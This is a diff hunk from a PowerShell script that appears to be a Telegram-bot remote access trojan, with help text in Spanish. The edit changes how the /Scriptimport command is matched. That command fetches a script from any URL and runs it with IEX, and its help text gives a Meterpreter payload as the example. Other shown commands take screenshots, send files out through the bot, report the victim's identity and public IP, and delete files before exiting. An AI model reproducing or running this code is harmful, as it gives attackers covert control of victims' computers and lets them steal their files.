@@ -208,8 +208,8 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Whoami") {$texto = whoami_me;$texto = $texto -replace "@{","" -replace "}",""; $texto -replace "; ","`n" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Ippublic") {$texto = public-ip -botkey $botkey | Format-List | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; sleep -Seconds 2 ; $ruta = $env:USERPROFILE + "\appdata\local\temp\1"; Set-Location $ruta; del *.*; Set-Location $env:USERPROFILE ;exit}
- if ($comando -like "/Scriptimport") {$texto = "/Scriptimport ejectuta script o comando powershell leyendo una archivo .txt desde una URL, Meterpreter, Empire...`nEjemplo: /scriptimport http://192.168.1.20/meterpreter.txt :D"}
- if ($comando -like "/Scriptimport*") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(curl $comando).content ;$texto = "Script Ejecutado desde $commando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -eq "/Scriptimport") {$texto = "/Scriptimport ejectuta script o comando powershell leyendo una archivo .txt desde una URL, Meterpreter, Empire...`nEjemplo: /scriptimport http://192.168.1.20/meterpreter.txt :D"}
+ if ($comando -like "/Scriptimport *") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(curl $comando).content ;$texto = "Script Ejecutado desde $commando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat_id $chat_id }
  if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
  if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
